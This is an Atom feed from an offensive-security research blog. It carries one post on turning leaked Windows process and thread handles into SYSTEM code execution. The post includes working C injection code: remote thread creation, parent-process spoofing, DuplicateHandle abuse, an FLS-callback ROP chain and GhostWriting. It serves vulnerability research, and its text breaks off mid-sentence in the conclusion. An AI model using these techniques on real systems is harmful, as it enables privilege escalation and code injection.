<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: exploit | ]]></title>
  <link href="http://hatRiot.github.io/blog/categories/exploit/atom.xml" rel="self"/>
  <link href="http://hatRiot.github.io/"/>
  <updated>2020-08-10T13:11:36-07:00</updated>
  <id>http://hatRiot.github.io/</id>
  <author>
    <name><![CDATA[Bryan Alexander]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Exploiting Leaked Process and Thread Handles]]></title>
    <link href="http://hatRiot.github.io/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/"/>
    <updated>2019-08-22T14:10:04-07:00</updated>
    <id>http://hatRiot.github.io/blog/2019/08/22/exploiting-leaked-process-and-thread-handles</id>
    <content type="html"><![CDATA[<p>Over the years I&rsquo;ve seen and exploited the occasional leaked handle bug. These can be
particularly fun to toy with, as the handles aren&rsquo;t always granted
<code>PROCESS_ALL_ACCESS</code> or <code>THREAD_ALL_ACCESS</code>, requiring a bit more ingenuity.
This post will address the various access rights assignable to handles and what we
can do to exploit them to gain elevated code execution. I&rsquo;ve chosen to focus
specifically on process and thread handles as this seems to be the most common,
but surely other objects can be exploited in similar manner.</p>

<p>As background, while this bug can occur under various circumstances, I&rsquo;ve most
commonly seen it manifest when some privileged process opens a handle with
<code>bInheritHandle</code> set to true. Once this happens, any child process of this
privileged process inherits the handle and all access it grants. As example,
assume a SYSTEM level process does this:</p>

<p><code>
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, GetCurrentProcessId());
</code></p>

<p>Since it&rsquo;s allowing the opened handle to be inherited, any child process
will gain access to it. If they execute userland code impersonating the desktop
user, as a service might often do, those userland processes will have access to
that handle.</p>

<h2>Existing bugs</h2>

<p>There are several public bugs we can point to over the years as example and
inspiration. As per usual James Forshaw has a fun one from 2016[0] in which
he&rsquo;s able to leak a privileged thread handle out of the secondary logon
service with <code>THREAD_ALL_ACCESS</code>. This is the most &ldquo;open&rdquo; of permissions, but
he exploited it in a novel way that I was unaware of, at the time.</p>

<p>Another one from Ivan Fratric exploited[1] a leaked process handle with
<code>PROCESS_DUP_HANDLE</code>, which even Microsoft knew was bad. In his <code>Bypassing
Mitigations by Attacking JIT Server in Microsoft Edge</code> whitepaper, he
identifies the JIT server process mapping memory into the content process. To
do this, the JIT process needs a handle to it. The content process calls
<code>DuplicateHandle</code> on itself with the <code>PROCESS_DUP_HANDLE</code>, which can be
exploited to obtain a full access handle.</p>

<p>A more recent example is a Dell LPE [2] in which a <code>THREAD_ALL_ACCESS</code> handle
was obtained from a privileged process. They were able to exploit this via a
dropped DLL and an APC.</p>

<h2>Setup</h2>

<p>In this post, I wanted to examine all possible access rights to determine which
were exploitable on there own and which were not. Of those that were not, I
tried to determine what concoction of privileges were necessary to make it so.
I&rsquo;ve tried to stay &ldquo;realistic&rdquo; here in my experience, but you never know what
you&rsquo;ll find in the wild, and this post reflects that.</p>

<p>For testing, I created a simple client and server: a privileged server that
leaks a handle, and a client capable of consuming it. Here&rsquo;s the server:</p>

<p>```</p>

<h1>include &ldquo;pch.h&rdquo;</h1>

<h1>include <iostream></h1>

<h1>include &lt;Windows.h></h1>

<p>int main(int argc, char **argv)
{</p>

<pre><code>if (argc &lt;= 1) {
    printf("[-] Please give me a target PID\n");
    return -1;
}

HANDLE hUserToken, hUserProcess;
HANDLE hProcess, hThread;
STARTUPINFOA si;
PROCESS_INFORMATION pi;

ZeroMemory(&amp;si, sizeof(si));
si.cb = sizeof(si);
ZeroMemory(&amp;pi, sizeof(pi));

hUserProcess = OpenProcess(PROCESS_QUERY_INFORMATION, false, atoi(argv[1]));
if (!OpenProcessToken(hUserProcess, TOKEN_ALL_ACCESS, &amp;hUserToken)) {
    printf("[-] Failed to open user process: %d\n", GetLastError());
    CloseHandle(hUserProcess);
    return -1;
}

hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, GetCurrentProcessId());
printf("[+] Process: %x\n", hProcess);

CreateProcessAsUserA(hUserToken, 
    "VulnServiceClient.exe", 
    NULL, NULL, NULL, TRUE, 0, NULL, NULL, &amp;si, &amp;pi);
SuspendThread(hThread);
return 0;
</code></pre>

<p>}
```</p>

<p>In the above, I&rsquo;m grabbing a handle to the token we want to impersonate,
opening an inheritable handle to the current process (which we&rsquo;re running as
SYSTEM), then spawning a child process. This child process is simply my client
application, which will go about attempting to exploit the handle.</p>

<p>The client is, of course, a little more involved. The only component that needs
a little discussion up front is fetching the leaked handle. This can be done
via <code>NtQuerySystemInformation</code> and does not require any special privileges:</p>

<p>```
void ProcessHandles()
{</p>

<pre><code>HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
_NtQuerySystemInformation NtQuerySystemInformation =
    (_NtQuerySystemInformation)GetProcAddress(hNtdll, "NtQuerySystemInformation");
_NtDuplicateObject NtDuplicateObject =
    (_NtDuplicateObject)GetProcAddress(hNtdll, "NtDuplicateObject");
_NtQueryObject NtQueryObject =
    (_NtQueryObject)GetProcAddress(hNtdll, "NtQueryObject");
_RtlEqualUnicodeString RtlEqualUnicodeString =
    (_RtlEqualUnicodeString)GetProcAddress(hNtdll, "RtlEqualUnicodeString");
_RtlInitUnicodeString RtlInitUnicodeString = 
    (_RtlInitUnicodeString)GetProcAddress(hNtdll, "RtlInitUnicodeString");

ULONG handleInfoSize = 0x10000;
NTSTATUS status;
PSYSTEM_HANDLE_INFORMATION phHandleInfo = (PSYSTEM_HANDLE_INFORMATION)malloc(handleInfoSize);
DWORD dwPid = GetCurrentProcessId();


printf("[+] Looking for process handles...\n");

while ((status = NtQuerySystemInformation(
    SystemHandleInformation,
    phHandleInfo,
    handleInfoSize,
    NULL
)) == STATUS_INFO_LENGTH_MISMATCH)
    phHandleInfo = (PSYSTEM_HANDLE_INFORMATION)realloc(phHandleInfo, handleInfoSize *= 2);

if (status != STATUS_SUCCESS)
{
    printf("NtQuerySystemInformation failed!\n");
    return;
}

printf("[+] Fetched %d handles\n", phHandleInfo-&gt;HandleCount);

// iterate handles until we find the privileged process
for (int i = 0; i &lt; phHandleInfo-&gt;HandleCount; ++i)
{
    SYSTEM_HANDLE handle = phHandleInfo-&gt;Handles[i];
    POBJECT_TYPE_INFORMATION objectTypeInfo;
    PVOID objectNameInfo;
    UNICODE_STRING objectName;
    ULONG returnLength;

    // Check if this handle belongs to the PID the user specified
    if (handle.ProcessId != dwPid)
        continue;

    objectTypeInfo = (POBJECT_TYPE_INFORMATION)malloc(0x1000);
    if (NtQueryObject(
        (HANDLE)handle.Handle,
        ObjectTypeInformation,
        objectTypeInfo,
        0x1000,
        NULL
    ) != STATUS_SUCCESS)
        continue;

    if (handle.GrantedAccess == 0x0012019f)
    {
        free(objectTypeInfo);
        continue;
    }

    objectNameInfo = malloc(0x1000);
    if (NtQueryObject(
        (HANDLE)handle.Handle,
        ObjectNameInformation,
        objectNameInfo,
        0x1000,
        &amp;returnLength
    ) != STATUS_SUCCESS)
    {
        objectNameInfo = realloc(objectNameInfo, returnLength);
        if (NtQueryObject(
            (HANDLE)handle.Handle,
            ObjectNameInformation,
            objectNameInfo,
            returnLength,
            NULL
        ) != STATUS_SUCCESS)
        {
            free(objectTypeInfo);
            free(objectNameInfo);
            continue;
        }
    }

    // check if we've got a process object; there should only be one, but should we 
    // have multiple, this is where we'd perform the checks
    objectName = *(PUNICODE_STRING)objectNameInfo;
    UNICODE_STRING pProcess, pThread;

    RtlInitUnicodeString(&amp;pThread, L"Thread");
    RtlInitUnicodeString(&amp;pProcess, L"Process");
    if (RtlEqualUnicodeString(&amp;objectTypeInfo-&gt;Name, &amp;pProcess, TRUE) &amp;&amp; TARGET == 0) {
        printf("[+] Found process handle (%x)\n", handle.Handle);
        HANDLE hProcess = (HANDLE)handle.Handle;
    }
    else if (RtlEqualUnicodeString(&amp;objectTypeInfo-&gt;Name, &amp;pThread, TRUE) &amp;&amp; TARGET == 1) {
        printf("[+] Found thread handle (%x)\n", handle.Handle);
        HANDLE hThread = (HANDLE)handle.Handle;
    else
        continue;

    free(objectTypeInfo);
    free(objectNameInfo);
}
</code></pre>

<p>}
```</p>

<p>We&rsquo;re essentially just fetching all system handles, filtering down to ones
belonging to our process, then hunting for a thread or a process. In a more
active client process with many threads or process handles we&rsquo;d need to filter
down further, but this is sufficient for testing.</p>

<p>The remainder of this post will be broken down into process and thread security
access rights.</p>

<h2>Process</h2>

<p>There are approximately 14 process-specific rights[3]. We&rsquo;re going to ignore
the standard object access rights for now (DELETE, READ_CONTROL, etc.) as they
apply more to the handle itself than what it allows one to do.</p>

<p>Right off the bat, we&rsquo;re going to dismiss the following:
<code>
PROCESS_QUERY_INFORMATION
PROCESS_QUERY_LIMITED_INFORMATION
PROCESS_SUSPEND_RESUME
PROCESS_TERMINATE
PROCESS_SET_QUOTA
PROCESS_VM_OPERATION
PROCESS_VM_READ
SYNCHRONIZE
</code>
To be clear I&rsquo;m only suggesting that the above access rights cannot be
exploited on their own; they are, of course, very useful when roped in with
others. There may be weird edge cases in which one of these might be useful
(PROCESS_TERMINATE, for example), but barring any magic, I don&rsquo;t see how.</p>

<p>That leaves the following:
<code>
PROCESS_ALL_ACCESS
PROCESS_CREATE_PROCESS
PROCESS_CREATE_THREAD
PROCESS_DUP_HANDLE
PROCESS_SET_INFORMATION
PROCESS_VM_WRITE
</code></p>

<p>We&rsquo;ll run through each of these individually.</p>

<h3>PROCESS_ALL_ACCESS</h3>

<p>The most obvious of them all, this one grants us access to it all. We can
simply allocate memory and create a thread to obtain code execution:
<code>
char payload[] = "\xcc\xcc";
LPVOID lpBuf = VirtualAllocEx(hProcess, NULL, 2, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProcess, lpBuf, payload, 2, NULL);
CreateRemoteThread(hProcess, NULL, 0, lpBuf, 0, 0, NULL);
</code></p>

<p>Nothing to it.</p>

<h3>PROCESS_CREATE_PROCESS</h3>

<p>This right is &ldquo;required to create a process&rdquo;, which is to say that we can spawn
child processes. To do this remotely, we just need to spawn a process and set
its parent to the privileged process we&rsquo;ve got a handle to. This will create
the new process and inherit its parent token which will hopefully be a SYSTEM
token.</p>

<p>Here&rsquo;s how we do that:
```</p>

<pre><code>STARTUPINFOEXA sinfo = { sizeof(sinfo) };
PROCESS_INFORMATION pinfo;
LPPROC_THREAD_ATTRIBUTE_LIST ptList = NULL;
SIZE_T bytes;

sinfo.StartupInfo.cb = sizeof(STARTUPINFOEXA);
InitializeProcThreadAttributeList(NULL, 1, 0, &amp;bytes);
ptList = (LPPROC_THREAD_ATTRIBUTE_LIST)malloc(bytes);
InitializeProcThreadAttributeList(ptList, 1, 0, &amp;bytes);

UpdateProcThreadAttribute(ptList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &amp;hPrivProc, sizeof(HANDLE), NULL, NULL);
sinfo.lpAttributeList = ptList;

CreateProcessA("cmd.exe", (LPSTR)"cmd.exe /c calc.exe", 
        NULL, NULL, TRUE, 
        EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, 
        &amp;sinfo.StartupInfo, &amp;pinfo);
</code></pre>

<p>```</p>

<p>We should now have calc running with the privileged token. Obviously we&rsquo;d want
to replace that with something more useful!</p>

<h3>PROCESS_CREATE_THREAD</h3>

<p>Here we&rsquo;ve got the ability to use <code>CreateRemoteThread</code>, but can&rsquo;t control any
memory in the target process. There are of course ways we can influence memory
without direct write access, such as WNF, but we&rsquo;d still have no way of
resolving those addresses. As it turns out, however, we don&rsquo;t need the control.
<code>CreateRemoteThread</code> can be pointed at a function with a single argument, which
gives us quite a bit of control. <code>LoadLibraryA</code> and <code>WinExec</code> are both great
candidates for executing child processes or loading arbitrary code.</p>

<p>As example, there&rsquo;s an ANSI <code>cmd.exe</code> located in msvcrt.dll at offset 0x503b8.
We can pass this as an argument to <code>CreateRemoteThread</code> and trigger a <code>WinExec</code>
call to pop a shell:</p>

<p>```
DWORD dwCmd = (GetModuleBaseAddress(GetCurrentProcessId(), L"msvcrt.dll") + 0x503b8);
HANDLE hThread = CreateRemoteThread(hPrivProc, NULL, 0,</p>

<pre><code>                    (LPTHREAD_START_ROUTINE)WinExec, 
                    (LPVOID)dwCmd, 
                    0, NULL);
</code></pre>

<p>```</p>

<p>We can do something similar for <code>LoadLibraryA</code>. This of course is predicated on
the system path containing a writable directory for our user.</p>

<h3>PROCESS_DUP_HANDLE</h3>

<p>Microsoft&rsquo;s own documentation on process security and access rights points to
this specifically as a sensitive right. Using it, we can simply duplicate our
process handle with <code>PROCESS_ALL_ACCESS</code>, allowing us full RW to its address
space. As per Ivan Fratric&rsquo;s JIT bug, it&rsquo;s as simple as this:</p>

<p><code>
HANDLE hDup = INVALID_HANDLE_VALUE;
DuplicateHandle(hPrivProc, GetCurrentProcess(), GetCurrentProcess(), &amp;hDup, PROCESS_ALL_ACCESS, 0, 0)
</code></p>

<p>Now we can simply follow the WriteProcessMemory/CreateRemoteThread strategy for
executing arbitrary code.</p>

<h3>PROCESS_SET_INFORMATION</h3>

<p>Granting this permission allows one to execute <code>SetInformationProcess</code> in
addition to several fields in <code>NtSetInformationProcess</code>. The latter is far more
powerful, but many of the <code>PROCESSINFOCLASS</code> fields available are either read
only or require additional privileges to actually set (<code>SeDebugPrivilege</code> for
<code>ProcessExceptionPort</code> and <code>ProcessInstrumentationCallback</code>(win7) for
example). Process Hacker[15] maintains an up to date definition of this class
and its members.</p>

<p>Of the available flags, none were particularly interesting on their own. I
needed to add <code>PROCESS_VM_*</code> privileges in order to make any usable and at
that point we defeat the purpose.</p>

<h3>PROCESS_VM_*</h3>

<p>This covers the three flavors of VM access: WRITE/READ/OPERATION. The first two
should be self-explanatory and the third allows one to operate on the virtual
address space itself, such as changing page protections (VirtualProtectEx) or
allocating memory (VirtualAllocEx). I won&rsquo;t address each permutation of these
three, but I think it&rsquo;s reasonable to assume that <code>PROCESS_VM_WRITE</code> is a
necessary requirement. While <code>PROCESS_VM_OPERATION</code> allows us to crash the
remote process which could open up other flaws, it&rsquo;s not a generic nor elegant
approach. Ditto with <code>PROCESS_VM_READ</code>.</p>

<p><code>PROCESS_VM_WRITE</code> proved to be a challenge on its own, and I was unable to
come up with a generic solution. At first blush, the entire set of
Shatter-like injection strategies documented by Hexacorn[12] seem like
they&rsquo;d be perfect. They simply require the remote process to use windows,
clipboard registrations, etc. None of these are guaranteed, but chances are one
is bound to exist. Unfortunately for us, many of them restrict access across
sessions or scaling integrity levels. We can write into the remote process,
but we need some way to gain control over execution flow.</p>

<p>In addition to being unable to modify page permissions, we cannot read nor
map/allocate memory. There are plenty of ways we can leak memory from the
remote process without directly interfacing with it, however.</p>

<p>Using <code>NtQuerySystemInformation</code>, for example, we can enumerate all threads
inside a remote process regardless of its IL. This grants us a list of
<code>SYSTEM_EXTENDED_THREAD_INFORMATION</code> objects which contain, among other
things, the address of the TEB. <code>NtQueryInformationProcess</code> allows us to fetch
the remote process PEB address. This latter API requires the
<code>PROCESS_QUERY_INFORMATION</code> right, however, which ended up throwing a major
wrench in my plan. Because of this I&rsquo;m appending <code>PROCESS_QUERY_INFORMATION</code>
onto <code>PROCESS_VM_WRITE</code> which gives us the necessary components to pull this
off. If someone knows of a way to leak the address of a remote process PEB
without it, I&rsquo;d love to hear.</p>

<p>The approach I took was a bit loopy, but it ended up working reliably and
generically. If you&rsquo;ve read my previous post on fiber local storage (FLS)[13],
this is the research I was referring to. If you haven&rsquo;t, I recommend giving it
a brief read, but I&rsquo;ll regurgitate a bit of it here.</p>

<p>Briefly, we can abuse fibers and FLS to overwrite callbacks which are executed
&ldquo;&hellip;on fiber deletion, thread exit, and when an FLS index is freed&rdquo;. The
primary thread of a process will always setup a fiber, thus there will always
be a callback for us to overwrite (msvcrt!_freefls). Callbacks are stored in
the PEB (FlsCallback) and the fiber local storage in the TEB (FlsData). By
smashing the FlsCallback we can obtain control over execution flow when one of
the fiber actions are taken.</p>

<p>With only write access to the process, however, this becomes a bit convoluted.
We cannot allocate memory and so we need some known location to put the
payload. In addition, the FlsCallback and FlsData variables in PEB/TEB are
pointers and we&rsquo;re unable to read these.</p>

<p>Stashing the payload turned out to be pretty simple. Since we&rsquo;ve established
we can leak PEB/TEB addresses we already have two powerful primitives. After
looking over both structures, I found that thread local storage (TLS) happened
to provide us with enough room to store ROP gadgets and a thin payload. TLS is
embedded within the structure itself, so we can simply offset into the TEB
address (which we have). If you&rsquo;re unfamiliar with TLS, Skywing&rsquo;s write-ups are
fantastic and have aged well[14].</p>

<p>Gaining control over the callback was a little trickier. A pointer to a
<code>_FLS_CALLBACK_INFO</code> structure is stored in the PEB (FlsCallback) and is an
opaque structure. Since we can&rsquo;t actually read this pointer, we have no simple
way of overwriting the pointer. Or do we?</p>

<p>What I ended up doing is overwriting the FlsCallback pointer itself in the PEB,
essentially creating my own fake <code>_FLS_CALLBACK_INFO</code> structure in TLS. It&rsquo;s a
pretty simple structure and really only has one value of importance: the
callback pointer.</p>

<p>In addition, as per the FLS article, we also need to take control over ECX/RCX.
This will allow us to stack pivot and continue executing our ROP payload. This
requires that we update the <code>TEB-&gt;FlsData</code> entry which we also are unable to
do, since it&rsquo;s a pointer. Much like <code>FlsCallback</code>, though, I was able to just
overwrite this value and craft my own data structure, which also turned out to
be pretty simple. The TLS buffer ended up looking like this:</p>

<p>```</p>

<pre><code>//
// 0  ] 00000000 00000000 [STACK PIVOT] 00000000
// 16 ] 00000000 00000000 [ECX VALUE] [NEW STACK PTR]
// 32 ] 41414141 41414141 41414141 41414141 
//
</code></pre>

<p>```</p>

<p>There just so happens to be a perfect stack pivot gadget located in
<code>kernelbase!SwitchToFiberContext</code> (or <code>kernel32!SwitchToFiber</code> on Windows 7):</p>

<p><code>
7603c415 8ba1d8000000    mov     esp,dword ptr [ecx+0D8h]
7603c41b c20400          ret     4
</code></p>

<p>Putting this all together, execution results in:</p>

<p><code>
eax=7603c415 ebx=7ffdf000 ecx=7ffded54 edx=00280bc9 esi=00000001 edi=7ffdee28
eip=7603c415 esp=0019fd6c ebp=0019fd84 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
kernel32!SwitchToFiber+0x115:
7603c415 8ba1d8000000    mov     esp,dword ptr [ecx+0D8h]
ds:0023:7ffdee2c=7ffdee30
0:000&gt; p
eax=7603c415 ebx=7ffdf000 ecx=7ffded54 edx=00280bc9 esi=00000001 edi=7ffdee28
eip=7603c41b esp=7ffdee30 ebp=0019fd84 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
kernel32!SwitchToFiber+0x11b:
7603c41b c20400          ret     4
0:000&gt; dd esp l3
7ffdee30  41414141 41414141 41414141
</code></p>

<p>Now we&rsquo;ve got EIP and a stack pivot. Instead of marking memory and executing
some other payload, I took a quick and lazy strategy and simply called
<code>LoadLibraryA</code> to load a DLL off disk from an arbitrary location. This works
well, is reliable, and even on process exit will execute and block, depending
on what you do within the DLL. Here&rsquo;s the final code to achieve all this:</p>

<p>```</p>

<pre><code>_NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll"), "NtWriteVirtualMemory");

LPVOID lpBuf = malloc(13*sizeof(SIZE_T));
HANDLE hProcess = OpenProcess(PROCESS_VM_WRITE|PROCESS_QUERY_INFORMATION, FALSE, dwTargetPid);
if (hProcess == NULL)
    return;

SIZE_T LoadLibA = (SIZE_T)LoadLibraryA;
SIZE_T RemoteTeb = GetRemoteTeb(hProcess), TlsAddr = 0;
TlsAddr = RemoteTeb + 0xe10;

SIZE_T RemotePeb = GetRemotePeb(hProcess);
SIZE_T PivotGadget = 0x7603c415;
SIZE_T StackAddress = (TlsAddr + 28) - 0xd8;
SIZE_T RtlExitThread = (SIZE_T)GetProcAddress(GetModuleHandleA("ntdll"), "RtlExitUserThread");
SIZE_T LoadLibParam = (SIZE_T)TlsAddr + 48;

//
// construct our TlsSlots payload:
// 0  ] 00000000 00000000 [STACK PIVOT] 00000000
// 16 ] 00000000 00000000 [ECX VALUE] [NEW STACK PTR]
// 32 ] [LOADLIB ADDR] 41414141 [RET ADDR] [LOADLIB ARG PTR]
// 48 ] 41414141
//

memset(lpBuf, 0x0, 16);
*((DWORD*)lpBuf + 2) = PivotGadget;
*((DWORD*)lpBuf+ 4) = 0;
*((DWORD*)lpBuf + 5) = 0;
*((DWORD*)lpBuf + 6) = StackAddress;

StackAddress = TlsAddr + 32;
*((DWORD*)lpBuf + 7) = StackAddress;
*((DWORD*)lpBuf + 8) = LoadLibA;
*((DWORD*)lpBuf + 9) = 0x41414141; // junk
*((DWORD*)lpBuf + 10) = RtlExitThread;
*((DWORD*)lpBuf + 11) = (SIZE_T)TlsAddr + 48;
*((DWORD*)lpBuf + 12) = 0x41414141; // DLL name (AAAA.dll)

NtWriteVirtualMemory(hProcess, (PVOID)TlsAddr, lpBuf, (13 * sizeof(SIZE_T)), NULL);

// update FlsCallback in PEB and FlsData in TEB
StackAddress = TlsAddr + 12;
NtWriteVirtualMemory(hProcess, (LPVOID)(RemoteTeb + 0xfb4), (PVOID)&amp;StackAddress, sizeof(SIZE_T), NULL);
NtWriteVirtualMemory(hProcess, (LPVOID)(RemotePeb + 0x20c), (PVOID)&amp;TlsAddr, sizeof(SIZE_T), NULL);
</code></pre>

<p>```</p>

<p>If all works well you should see attempts to load <code>AAAA.dll</code> off disk when the
callback is executed (just close the process). As a note, we&rsquo;re using
<code>NtWriteVirtualMemory</code> here because <code>WriteProcessMemory</code> requires
<code>PROCESS_VM_OPERATION</code> which we may not have.</p>

<p>Another variation of this access might be <code>PROCESS_VM_WRITE|PROCESS_VM_READ</code>.
This gives us visibility into the address space, but we still cannot allocate
or map memory into the remote process. Using the above strategy we can rid
ourselves of the <code>PROCESS_QUERY_INFORMATION</code> requirement and simply read the
PEB address out of TEB.</p>

<p>Finally, consider <code>PROCESS_VM_WRITE|PROCESS_VM_READ|PROCESS_VM_OPERATION</code>.
Granting us <code>PROCESS_VM_OPERATION</code> loosens the restrictions quite a bit, as we
can now allocate memory and change page permissions. This allows us to more
easily use the above strategy, but also perform inline and IAT hooks.</p>

<h2>Thread</h2>

<p>As with the process handles, there are a handful of access rights we can dismiss
immediately:
<code>
SYNCHRONIZE
THREAD_QUERY_INFORMATION
THREAD_GET_CONTEXT
THREAD_QUERY_LIMITED_INFORMATION
THREAD_SUSPEND_RESUME
THREAD_TERMINATE
</code></p>

<p>Which leaves the following:
<code>
THREAD_ALL_ACCESS
THREAD_DIRECT_IMPERSONATION
THREAD_IMPERSONATE
THREAD_SET_CONTEXT
THREAD_SET_INFORMATION
THREAD_SET_LIMITED_INFORMATION
THREAD_SET_THREAD_TOKEN
</code></p>

<h3>THREAD_ALL_ACCESS</h3>

<p>There&rsquo;s quite a lot we can do with this, including everything described in the
following thread access rights sections. I personally find the
<code>THREAD_DIRECT_IMPERSONATION</code> strategy to be the easiest.</p>

<p>There is another option that is a bit more arcane, but equally viable. Note
that this thread access doesn&rsquo;t give us VM read/write privileges, so there&rsquo;s
no easy to way to &ldquo;write&rdquo; into a thread, since that doesn&rsquo;t really make sense.
What we do have, however, is a series of APIs that sort of grant us that:
<code>SetThreadContext</code>[4] and <code>GetThreadContext</code>[5]. About a decade ago a code
injection technique dubbed Ghostwriting[6] was released to little fanfare. In
it, the author describes a code injection strategy that does not require the
typical win32 API calls; there&rsquo;s no WriteProcessMemory, NtMapViewOfSection, or
even OpenProcess.</p>

<p>While the write-up is lacking in a few departments, it&rsquo;s quite a clever bit of
code. In short, the author abuses the <code>SetThreadContext</code>/<code>GetThreadContext</code>
calls in tandem with a set of specific assembly gadgets to write a payload,
dword by dword, onto the threads stack. Once written, they use
<code>NtProtectVirtualMemoryAddress</code> to mark the code RWX and redirect code flow to
their payload.</p>

<p>For their write gadget, they hunt for a pattern inside NTDLL:</p>

<p><code>
MOV [REG1], REG2
RET
</code></p>

<p>They then locate a <code>JMP $</code>, or jump here, which will operate as an auto lock
and infinitely loop. Once we&rsquo;ve found our two gadgets, we suspend the thread.
We update its RIP to point to the MOV gadget, set our REG1 to an adjusted RSP
so the return address is the <code>JMP $</code>, and set REG2 to the jump gadget. Here&rsquo;s
my write function:</p>

<p>```
void WriteQword(CONTEXT context, HANDLE hThread, size_t WriteWhat, size_t WriteWhere)
{</p>

<pre><code>SetContextRegister(&amp;context, g_rside, WriteWhat);
SetContextRegister(&amp;context, g_lside, WriteWhere);

context.Rsp = StackBase;
context.Rip = MovAddr;

WaitForThreadAutoLock(hThread, &amp;context, JmpAddr);
</code></pre>

<p>}
```</p>

<p>The <code>SetContextRegister</code> call simply assigns REG1 and REG2 in our gadget to the
appropriate registers. Once those are set, we set our stack base (adjusted from
threads RSP) and update RIP to our gadget. The first time we execute this we&rsquo;ll
write our <code>JMP $</code> gadget to the stack.</p>

<p>They use what they call a thread auto lock to control execution flow (edits
mine):</p>

<p>```
void WaitForThreadAutoLock(HANDLE Thread, CONTEXT* PThreadContext,HWND ThreadsWindow,DWORD AutoLockTargetEIP)
{</p>

<pre><code>SetThreadContext(Thread,PThreadContext);

do
{
    ResumeThread(Thread);
    Sleep(30); 
    SuspendThread(Thread);
    GetThreadContext(Thread,PThreadContext);
}
while(PThreadContext-&gt;Eip!=AutoLockTargetEIP);
</code></pre>

<p>}
```</p>

<p>It&rsquo;s really just a dumb waiter that allows the thread to execute a little bit
each run before checking if the &ldquo;sink&rdquo; gadget has been reached.</p>

<p>Once our execution hits the jump, we have our write primitive. We can now
simply adjust RIP back to the MOV gadget, update RSP, and set REG1 and REG2 to
any values we want.</p>

<p>I ported the core function of this technique to x64 to demonstrate its
viability. Instead of using it to execute an entire payload, I simply execute
<code>LoadLibraryA</code> to load in an arbitrary DLL at an arbitrary path. The code is
available on Github[11]. Turning it into something production ready is left as
an exercise for the reader ;)</p>

<p>Additionally, while attending Blackhat 2019, I saw a process injection talk by
the SafeBreach Labs group. They&rsquo;ve release a code injection tool that contains
an x64 implementation of GhostWriting[10]. While I haven&rsquo;t personally evaluated
it, it&rsquo;s probably more production ready and usable than mine.</p>

<h3>THREAD_DIRECT_IMPERSONATION</h3>

<p>This differs from <code>THREAD_IMPERSONATE</code> in that it allows the thread token to be
impersonated, not simply TO impersonate. Exploiting this is simply a matter of
using the <code>NtImpersonateThread</code>[8] API, as pointed out by James Forshaw[0][7].
Using this we&rsquo;re able to create a thread totally under our control and
impersonate the privileged one:</p>

<p><code>
hNewThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)lpRtl, 0, CREATE_SUSPENDED, &amp;dwTid);
NtImpersonateThread(hNewThread, hThread, &amp;sqos);
</code></p>

<p>The <code>hNewThread</code> will now be executing with a SYSTEM token, allowing us to do
whatever we need under the privileged impersonation context.</p>

<h3>THREAD_IMPERSONATE</h3>

<p>Unfortunately I was unable to identify a surefire, generic method for
exploiting this one. We have no ability to query the remote thread, nor can we
gain any control over its execution flow. We&rsquo;re simply allowed to manage its
impersonation state.</p>

<p>We can use this to force the privileged thread to impersonate us, using the
<code>NtImpersonateThread</code> call, which may unlock additional logic bugs in the
application. For example, if the service were to create shared resources under
a user context for which it would typically be SYSTEM, such as a file, we can
gain ownership over that file. If multiple privileged threads access it for
information (such as configuration) it could lead to code execution.</p>

<h3>THREAD_SET_CONTEXT</h3>

<p>While this right grants us access to <code>SetThreadContext</code>, it also conveniently
allows us to use <code>QueueUserAPC</code>. This is effectively granting us a
<code>CreateRemoteThread</code> primitive with caveat. For an APC to be processed by the
thread, it needs to enter an alertable state. This happens when a specific set
of win32 functions are executed, so it is entirely possible that the thread
never becomes alertable.</p>

<p>If we&rsquo;re working with an uncooperative thread, <code>SetThreadContext</code> comes in
handy. Using it, we can force the thread to become alertable via the
<code>NtTestAlert</code> function. Of course, we have no ability to call
<code>GetThreadContext</code> and will therefore likely lose control of the thread after
exploitation.</p>

<p>In combination with <code>THREAD_GET_CONTEXT</code>, this right would allow us to
replicate the Ghostwriting code injection technique discussed in the
<code>THREAD_ALL_ACCESS</code> section above.</p>

<h3>THREAD_SET_INFORMATION</h3>

<p>Needed to set various ThreadInformationClass[9] values on a thread, usually via
<code>NtSetInformationThread</code>. After looking through all of these, I did not
identify any immediate ways in which we could influence the remote thread. Some
of the values are interesting but unusuable (<code>ThreadSetTlsArrayAddress</code>,
<code>ThreadAttachContainer</code>, etc) and are either not implemented/removed or
require <code>SeDebugPrivilege</code> or similar.</p>

<p>I&rsquo;m not really sure what would make this a viable candidate either. There&rsquo;s
really not a lot of juicy stuff that can be done via the available functions</p>

<h3>THREAD_SET_LIMITED_INFORMATION</h3>

<p>This allows the caller to set a subset of <code>THREAD_INFORMATION_CLASS</code> values,
namely: <code>ThreadPriority</code>, <code>ThreadPriorityBoost</code>, <code>ThreadAffinityMask</code>,
<code>ThreadSelectedCpuSets</code>, and <code>ThreadNameInformation</code>. None of these get us
anywhere near an exploitable primitive.</p>

<h3>THREAD_SET_THREAD_TOKEN</h3>

<p>Similar to <code>THREAD_IMPERSONATE</code>, I was unable to find a direct and generic
method of abusing this right. I can set the thread&rsquo;s token or modify a few
fields (via <code>SetTokenInformation</code>), but this doesn&rsquo;t grant us much.</p>

<h2>Conclusion</h2>

<p>I was a little disappointed in how uneventful thread rights seemed to be.
Almost half of them proved to be unexploitable on their own, and even in
combination did not turn much up. As per above, having one of the following
three privileges is necessary to turn a leaked thread handle into something
exploitable:</p>

<p><code>
THREAD_ALL_ACCESS
THREAD_DIRECT_IMPERSONATION
THREAD_SET_CONTEXT
</code></p>

<p>Missing these will require a deeper understanding of your target and some
